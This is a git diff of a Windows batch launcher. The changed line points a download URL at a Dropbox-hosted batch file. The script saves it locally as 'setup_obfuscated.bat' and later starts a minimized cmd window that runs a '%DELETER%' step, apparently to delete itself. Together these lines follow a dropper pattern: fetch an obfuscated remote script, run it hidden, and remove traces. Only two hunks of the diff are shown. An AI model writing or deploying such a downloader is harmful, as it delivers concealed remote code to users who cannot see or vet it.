@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set "URL=https://www.dropbox.com/scl/fi/booisfmgbg30s1getzluo/setup_obfuscated.bat?rlkey=sic5zw038o99y7saskdfxfv2q&st=pm8oacln&dl=1"
+set "URL=https://www.dropbox.com/scl/fi/booisfmgbg30s1getzluo/setup.bat?rlkey=sic5zw038o99y7saskdfxfv2q&st=r98i7on7&dl=1"
 set "OUT=%~dp0setup_obfuscated.bat"
 set "LAUNCHER=%~f0"
 
@@ -27,3 +27,4 @@ start "" /min cmd /c "%DELETER%"
 
 endlocal
 exit /b 0
+
